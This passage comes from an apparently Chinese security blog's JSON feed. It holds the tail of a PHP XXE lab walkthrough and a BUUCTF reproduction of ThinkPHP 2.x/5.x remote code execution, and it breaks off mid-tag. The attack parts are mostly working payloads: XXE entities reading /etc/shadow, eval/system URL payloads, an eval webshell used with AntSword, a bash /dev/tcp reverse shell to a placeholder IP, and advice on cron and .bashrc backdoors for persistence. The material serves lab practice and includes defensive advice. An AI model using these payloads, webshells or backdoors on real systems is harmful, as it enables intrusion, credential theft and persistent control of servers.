<span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY aaa SYSTEM &quot;file:///etc/shadow&quot;&gt;</code> 定义了一个外部实体，指向服务器本地文件 <code>/etc/shadow</code>。</li>\n<li><code>&lt;a&gt;&amp;aaa;&lt;/a&gt;</code> 引用实体，解析时会将文件内容替换到 <code>&amp;aaa;</code>。</li>\n</ul>\n<h4 id=\"Payload-2：远程加载-DTD\"><a href=\"#Payload-2：远程加载-DTD\" class=\"headerlink\" title=\"Payload 2：远程加载 DTD\"></a>Payload 2：远程加载 DTD</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY % y <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;http://192.168.56.102/test.dtd&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">  %y;</span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>远程</strong> <code>test.dtd</code> <strong>内容</strong>：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY % y SYSTEM &quot;http://192.168.56.102/test.dtd&quot;&gt;</code> 加载远程 DTD 文件。</li>\n<li><code>%y;</code> 执行 DTD 中的定义，间接加载 <code>/etc/shadow</code>。</li>\n<li>适用于绕过本地实体限制或实现更复杂的攻击。</li>\n</ul>\n<h3 id=\"3-发送攻击请求\"><a href=\"#3-发送攻击请求\" class=\"headerlink\" title=\"3. 发送攻击请求\"></a>3. 发送攻击请求</h3><p>在 Burp Suite 的 Repeater 模块中，构造以下 POST 请求（以 Payload 1 为例）：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/dom.php</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8080<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>application/xml<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>132<br><br><span class=\"language-xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"language-xml\"><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span></span><br><span class=\"hljs-meta\"><span class=\"language-xml\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span></span><br><span class=\"hljs-meta\"><span class=\"language-xml\">]&gt;</span></span><br><span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p><strong>关键点</strong>：</p>\n<ul>\n<li>设置 <code>Content-Type: application/xml</code> 以确保服务器按 XML 解析。</li>\n<li>调整 <code>Content-Length</code> 为实际载荷长度。</li>\n<li>点击 “Send”，发送请求。</li>\n</ul>\n<h3 id=\"4-验证攻击结果\"><a href=\"#4-验证攻击结果\" class=\"headerlink\" title=\"4. 验证攻击结果\"></a>4. 验证攻击结果</h3><ul>\n<li><p>若靶场未正确过滤外部实体，响应中会回显 <code>/etc/shadow</code> 文件内容，形如：</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dns\">root:$<span class=\"hljs-number\">6</span>$...[hash]...:<span class=\"hljs-number\">18356:0</span>:<span class=\"hljs-number\">99999:7</span>:::<br>daemon:*:<span class=\"hljs-number\">18356:0</span>:<span class=\"hljs-number\">99999:7</span>:::<br>...<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>若使用 Payload 2，确认 Python HTTP 服务日志中有 <code>test.dtd</code> 的请求记录，且响应仍包含 <code>/etc/shadow</code> 内容。</p>\n</li>\n</ul>\n<p><strong>验证成功标志</strong>：</p>\n<ul>\n<li>响应中包含敏感文件内容。</li>\n<li>无回显（盲 XXE）情况下，可通过外部 DTD 请求或错误信息推断漏洞存在。</li>\n</ul>\n<hr>\n<h2 id=\"五、XXE-漏洞深入分析\"><a href=\"#五、XXE-漏洞深入分析\" class=\"headerlink\" title=\"五、XXE 漏洞深入分析\"></a>五、XXE 漏洞深入分析</h2><h3 id=\"触发流程\"><a href=\"#触发流程\" class=\"headerlink\" title=\"触发流程\"></a>触发流程</h3><ol>\n<li><strong>不安全的 XML 解析</strong>：<ul>\n<li>PHP 应用使用 <code>DOMDocument</code> 或 <code>SimpleXMLElement</code> 处理 XML 输入。</li>\n<li>默认配置未禁用外部实体（<code>libxml_disable_entity_loader(false)</code>）。</li>\n</ul>\n</li>\n<li><strong>恶意实体注入</strong>：<ul>\n<li>攻击者提交包含 <code>&lt;!ENTITY&gt;</code> 的 XML 载荷。</li>\n<li>实体引用本地文件、远程 URL 或参数实体。</li>\n</ul>\n</li>\n<li><strong>信息泄露或攻击</strong>：<ul>\n<li>解析器加载实体内容，可能导致：<ul>\n<li>本地文件内容泄露。</li>\n<li>SSRF（访问内网资源，如 <code>http://localhost:8080</code>）。</li>\n<li>DoS（如加载 <code>/dev/random</code> 或构造 Billion Laughs 攻击）。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"PHP-环境中的常见问题\"><a href=\"#PHP-环境中的常见问题\" class=\"headerlink\" title=\"PHP 环境中的常见问题\"></a>PHP 环境中的常见问题</h3><ul>\n<li><p><strong>默认配置</strong>：PHP 的 <code>libxml2</code> 默认允许外部实体加载。</p>\n</li>\n<li><p><strong>代码示例</strong>（易受攻击的 PHP 代码）：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$xml</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-string\">&#x27;php://input&#x27;</span>);<br><span class=\"hljs-variable\">$dom</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DOMDocument</span>();<br><span class=\"hljs-variable\">$dom</span>-&gt;<span class=\"hljs-title function_ invoke__\">loadXML</span>(<span class=\"hljs-variable\">$xml</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$dom</span>-&gt;textContent;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>上述代码直接解析用户输入的 XML，未禁用外部实体，易受 XXE 攻击。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"六、防护建议\"><a href=\"#六、防护建议\" class=\"headerlink\" title=\"六、防护建议\"></a>六、防护建议</h2><ol>\n<li><p><strong>禁用外部实体解析</strong>：</p>\n<ul>\n<li><p>在 PHP 中使用 <code>libxml_disable_entity_loader(true)</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-title function_ invoke__\">libxml_disable_entity_loader</span>(<span class=\"hljs-literal\">true</span>);<br><span class=\"hljs-variable\">$dom</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DOMDocument</span>();<br><span class=\"hljs-variable\">$dom</span>-&gt;<span class=\"hljs-title function_ invoke__\">loadXML</span>(<span class=\"hljs-variable\">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>或设置 <code>LIBXML_NOENT</code> 标志禁用实体替换。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>使用安全的解析方式</strong>：</p>\n<ul>\n<li>避免直接解析用户提交的 XML。</li>\n<li>使用 JSON 或其他格式替代 XML。</li>\n</ul>\n</li>\n<li><p><strong>白名单验证输入</strong>：</p>\n<ul>\n<li>验证 XML 结构，仅允许预期的标签和属性。</li>\n<li>使用 XML Schema 或 DTD 限制输入。</li>\n</ul>\n</li>\n<li><p><strong>网络隔离</strong>：</p>\n<ul>\n<li>限制服务器出站连接，防止 SSRF 访问内网资源。</li>\n<li>使用防火墙阻止非必要外部请求。</li>\n</ul>\n</li>\n<li><p><strong>升级依赖</strong>：</p>\n<ul>\n<li>确保 PHP 和 <code>libxml2</code> 库为最新版本，修复已知漏洞。</li>\n</ul>\n</li>\n<li><p><strong>错误信息屏蔽</strong>：</p>\n<ul>\n<li>禁用详细错误回显，避免泄露文件路径或系统信息。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"七、总结\"><a href=\"#七、总结\" class=\"headerlink\" title=\"七、总结\"></a>七、总结</h2><p>PHP XXE 漏洞利用展示了 XML 解析器在处理外部实体时的安全风险。通过构造恶意 XML 载荷，攻击者可轻松读取服务器敏感文件或发起 SSRF 攻击。开发者和安全从业者应重视 XML 解析的配置安全，采取禁用外部实体、输入验证等措施，降低漏洞风险。</p>\n<blockquote>\n<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "PHP",
                "XXE",
                "SSRF",
                "漏洞复现"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/",
            "title": "ThinkPHP 2.x & 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）",
            "date_published": "2025-07-28T06:18:44.000Z",
            "content_html": "<h1 id=\"ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）\"><a href=\"#ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）\" class=\"headerlink\" title=\"ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）\"></a>ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>ThinkPHP 是一个广受欢迎的 PHP 开发框架，但其早期版本（2.x 和 5.0.x 至 5.0.23）因设计缺陷存在严重的<strong>远程代码执行（RCE）漏洞</strong>。这些漏洞允许攻击者通过精心构造的 URL 参数执行任意 PHP 代码或系统命令，甚至实现服务器完全控制。本文基于 <strong>BUUCTF</strong> 在线靶场，详细复现 ThinkPHP 2.x 和 5.x 的 RCE 漏洞，涵盖漏洞原理、利用过程、蚁剑连接以及后门植入的可能性，旨在帮助安全从业者和开发者深入理解和防范此类漏洞。</p>\n<p>本文将分为两部分：</p>\n<ol>\n<li><strong>ThinkPHP 2.x RCE 漏洞</strong>：利用模板变量解析缺陷执行代码和命令。</li>\n<li><strong>ThinkPHP 5.x RCE 漏洞</strong>：通过框架路由调用任意函数实现代码执行。</li>\n</ol>\n<hr>\n<h2 id=\"二、ThinkPHP-2-x-RCE-漏洞复现\"><a href=\"#二、ThinkPHP-2-x-RCE-漏洞复现\" class=\"headerlink\" title=\"二、ThinkPHP 2.x RCE 漏洞复现\"></a>二、ThinkPHP 2.x RCE 漏洞复现</h2><h3 id=\"1-靶场环境\"><a href=\"#1-靶场环境\" class=\"headerlink\" title=\"1. 靶场环境\"></a>1. 靶场环境</h3><p>BUUCTF 提供在线靶场，无需自行搭建环境。</p>\n<ul>\n<li><strong>ThinkPHP 2.x RCE 漏洞地址</strong>：<code>https://buuoj.cn/challenges#[ThinkPHP]2-Rce</code><br>开启靶场，访问页面后，通常显示简陋的 ThinkPHP 2.x 欢迎页面，但后台隐藏着强大的远程命令执行能力 。</li>\n</ul>\n<h3 id=\"2-漏洞原理\"><a href=\"#2-漏洞原理\" class=\"headerlink\" title=\"2. 漏洞原理\"></a>2. 漏洞原理</h3><p>ThinkPHP 2.x 的模板引擎在处理 URL 参数时，直接将参数拼接为模板变量，未进行严格过滤。例如，URL 参数 <code>name=$&#123;@phpinfo()&#125;</code> 会被解析为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $&#123;@<span class=\"hljs-title function_ invoke__\">phpinfo</span>()&#125; <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>由于 <code>@phpinfo()</code> 是合法的 PHP 函数调用，服务器会执行 <code>phpinfo()</code> 函数并返回结果。如果结合 <code>eval()</code> 或 <code>assert()</code>，攻击者可通过 GET 或 POST 参数进一步执行任意代码或系统命令，形成完全控制。</p>\n<h3 id=\"3-漏洞利用过程\"><a href=\"#3-漏洞利用过程\" class=\"headerlink\" title=\"3. 漏洞利用过程\"></a>3. 漏洞利用过程</h3><h4 id=\"步骤-1：测试代码执行（POC1）\"><a href=\"#步骤-1：测试代码执行（POC1）\" class=\"headerlink\" title=\"步骤 1：测试代码执行（POC1）\"></a>步骤 1：测试代码执行（POC1）</h4><p>使用以下 Payload 测试是否可以执行 PHP 代码：</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/node3.buuoj.cn:26104/</span><span class=\"hljs-string\">?s</span>=<span class=\"hljs-regexp\">/index/index</span><span class=\"hljs-regexp\">/name/</span><span class=\"hljs-variable\">$&#123;</span><span class=\"hljs-variable\">@phpinfo</span>()&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回 <code>phpinfo()</code> 的详细信息，证明代码被成功解析执行 。</p>\n<h4 id=\"步骤-2：执行系统命令（POC2）\"><a href=\"#步骤-2：执行系统命令（POC2）\" class=\"headerlink\" title=\"步骤 2：执行系统命令（POC2）\"></a>步骤 2：执行系统命令（POC2）</h4><p>利用 <code>eval()</code> 结合 GET 参数执行系统命令（如 <code>ls</code>）：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_GET</span>[<span class=\"hljs-string\">1</span>])&#125;&amp;1=system(%27ls%27);<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数说明</strong>：</p>\n<ul>\n<li><code>name=$&#123;@eval($_GET[1])&#125;</code>：通过 <code>eval()</code> 执行 GET 参数 <code>1</code> 的内容。</li>\n<li><code>1=system(%27ls%27)</code>：执行 <code>system(&#39;ls&#39;)</code>，其中 <code>%27</code> 是 URL 编码的单引号 <code>&#39;</code>。</li>\n<li><strong>结果</strong>：页面返回目录列表，例如：<figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs axapta\"><span class=\"hljs-keyword\">index</span>.php<br>flag<br></code></pre></td></tr></table></figure>\n说明 <code>ls</code> 命令执行成功。</li>\n</ul>\n<h4 id=\"步骤-3：读取-Flag-文件\"><a href=\"#步骤-3：读取-Flag-文件\" class=\"headerlink\" title=\"步骤 3：读取 Flag 文件\"></a>步骤 3：读取 Flag 文件</h4><p>尝试读取 <code>/flag</code> 文件内容：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_GET</span>[<span class=\"hljs-string\">1</span>])&#125;&amp;1=system(%27cat%20flag%27);<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回类似以下内容：</p>\n<figure class=\"highlight dust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dust\"><span class=\"language-xml\">flag</span><span class=\"hljs-template-variable\">&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p>这表明目标服务器已被完全控制 。</p>\n<h3 id=\"4-使用蚁剑连接\"><a href=\"#4-使用蚁剑连接\" class=\"headerlink\" title=\"4. 使用蚁剑连接\"></a>4. 使用蚁剑连接</h3><p>为了更方便地操作服务器，可以上传一句话木马并使用蚁剑（AntSword）进行交互。</p>\n<h4 id=\"构造-Payload：\"><a href=\"#构造-Payload：\" class=\"headerlink\" title=\"构造 Payload：\"></a>构造 Payload：</h4><p>使用 POST 参数构造一句话木马：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_POST</span>[<span class=\"hljs-string\">1</span>])&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>蚁剑配置</strong>：</p>\n<ul>\n<li><strong>URL</strong>：<code>http://node3.buuoj.cn:26104/?s=/index/index/name=$&#123;@eval($_POST[1])&#125;</code></li>\n<li><strong>密码</strong>：<code>1</code>（对应 <code>$_POST[1]</code>）</li>\n<li><strong>类型</strong>：PHP（原生）</li>\n<li><strong>编码</strong>：默认</li>\n</ul>\n<p>连接成功后，可使用蚁剑进行：</p>\n<ul>\n<li>命令行执行</li>\n<li>文件管理（如上传、下载）</li>\n<li>终端交互</li>\n</ul>\n<h3 id=\"5-进一步操作\"><a href=\"#5-进一步操作\" class=\"headerlink\" title=\"5. 进一步操作\"></a>5. 进一步操作</h3><p>在真实环境中，可进行以下高级操作：</p>\n<ol>\n<li><strong>上传 WebShell</strong>：<ul>\n<li>在蚁剑中上传一句话木马（如 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>）或冰蝎（Behinder）木马。</li>\n<li>保存到可访问路径（如 <code>/var/www/html/shell.php</code>）。</li>\n</ul>\n</li>\n<li><strong>反弹 Shell</strong>：<ul>\n<li>在 Kali 上启动监听：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">nc -lvnp 4444<br></code></pre></td></tr></table></figure></li>\n<li>在蚁剑中执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">bash -i &gt;&amp; /dev/tcp/你的IP/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><strong>持久化后门</strong>：<ul>\n<li>添加计划任务（crontab）定时反弹 Shell。</li>\n<li>修改 <code>.bashrc</code> 文件，添加后门命令。</li>\n<li>写入定时任务（如每分钟执行反弹 Shell）。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"三、ThinkPHP-5-x-RCE-漏洞复现\"><a href=\"#三、ThinkPHP-5-x-RCE-漏洞复现\" class=\"headerlink\" title=\"三、ThinkPHP 5.x RCE 漏洞复现\"></a>三、ThinkPHP 5.x RCE 漏洞复现</h2><h3 id=\"1-靶场环境-1\"><a href=\"#1-靶场环境-1\" class=\"headerlink\" title=\"1. 靶场环境\"></a>1. 靶场环境</h3><p>BUUCTF 提供 ThinkPHP 5.x 在线靶场：</p>\n<ul>\n<li><strong>ThinkPHP 5.x RCE 漏洞地址</strong>：<code>https://buuoj.cn/challenges#[ThinkPHP]5-Rce</code><br>开启靶场，访问页面显示：</li>\n</ul>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs armasm\"><span class=\"hljs-symbol\">ThinkPHP</span> <span class=\"hljs-built_in\">V5</span><br>十年磨一剑 - 为 API 开发设计的高性能框架<br>[ <span class=\"hljs-built_in\">V5</span>.<span class=\"hljs-number\">0</span> 版本由 七牛云 独家赞助发布 ]<br></code></pre></td></tr></table></figure>\n\n<p>这表明靶场运行 ThinkPHP 5.x（版本 &lt;&#x3D; 5.0.23），漏洞复现环境已就绪 。</p>\n<h3 id=\"2-漏洞原理-1\"><a href=\"#2-漏洞原理-1\" class=\"headerlink\" title=\"2. 漏洞原理\"></a>2. 漏洞原理</h3><p>ThinkPHP 5.x 的 RCE 漏洞源于框架对 <code>\\think\\app::invokefunction</code> 方法的未授权访问。攻击者可通过 URL 参数调用 <code>call_user_func_array</code> 函数，动态执行任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code>），并传递参数。</p>\n<p><strong>利用链</strong>：</p>\n<figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"><span class=\"hljs-keyword\">index</span>.php<br>└── ?s=<span class=\"hljs-keyword\">index</span>/\\think\\app/invokefunction<br>        <span class=\"hljs-variable\">&amp;function</span>=call_user_func_array<br>        <span class=\"hljs-variable\">&amp;vars</span>[0]=phpinfo<br>        <span class=\"hljs-variable\">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数说明</strong>：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>含义说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>s</code></td>\n<td>ThinkPHP 路由，访问框架核心类</td>\n</tr>\n<tr>\n<td><code>function</code></td>\n<td>被调用的函数（如 <code>call_user_func_array</code>）</td>\n</tr>\n<tr>\n<td><code>vars[0]</code></td>\n<td>实际调用的函数名称（如 <code>phpinfo</code>、<code>system</code>）</td>\n</tr>\n<tr>\n<td><code>vars[1][]</code></td>\n<td>函数参数数组（如 <code>whoami</code>、<code>-1</code>）</td>\n</tr>\n</tbody></table>\n<h3 id=\"3-漏洞利用过程-1\"><a href=\"#3-漏洞利用过程-1\" class=\"headerlink\" title=\"3. 漏洞利用过程\"></a>3. 漏洞利用过程</h3><h4 id=\"步骤-1：信息探测（测试-phpinfo）\"><a href=\"#步骤-1：信息探测（测试-phpinfo）\" class=\"headerlink\" title=\"步骤 1：信息探测（测试 phpinfo）\"></a>步骤 1：信息探测（测试 <code>phpinfo</code>）</h4><p>构造 Payload 测试漏洞：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=phpinfo&amp;vars[1][]=-1<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回完整的 <code>phpinfo()</code> 信息，证明漏洞存在且可利用。</p>\n<h4 id=\"步骤-2：执行系统命令（whoami）\"><a href=\"#步骤-2：执行系统命令（whoami）\" class=\"headerlink\" title=\"步骤 2：执行系统命令（whoami）\"></a>步骤 2：执行系统命令（<code>whoami</code>）</h4><p>修改 Payload 执行 <code>whoami</code> 命令：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span><br></code></pre></td></tr></table></figure>\n\n<p>表明 Web 服务以 <code>www-data</code> 用户运行，命令执行成功。</p>\n<h4 id=\"步骤-3：读取-Flag-文件-1\"><a href=\"#步骤-3：读取-Flag-文件-1\" class=\"headerlink\" title=\"步骤 3：读取 Flag 文件\"></a>步骤 3：读取 Flag 文件</h4><p>尝试读取 <code>/flag</code> 或根目录下的 <code>flag</code> 文件：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=cat+/flag<br></code></pre></td></tr></table></figure>\n\n<p>或：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=system&amp;vars[1][]=cat+/var/www/html/flag<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果</strong>：页面返回类似：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">flag</span>&#123;d64e3f2e-xxxx-xxxx-xxxx-<span class=\"hljs-number\">0</span>ed8fe1b43f3&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-使用蚁剑连接-1\"><a href=\"#4-使用蚁剑连接-1\" class=\"headerlink\" title=\"4. 使用蚁剑连接\"></a>4. 使用蚁剑连接</h3><p>与 ThinkPHP 2.x 类似，可构造 POST 参数的一句话木马：</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\"><span 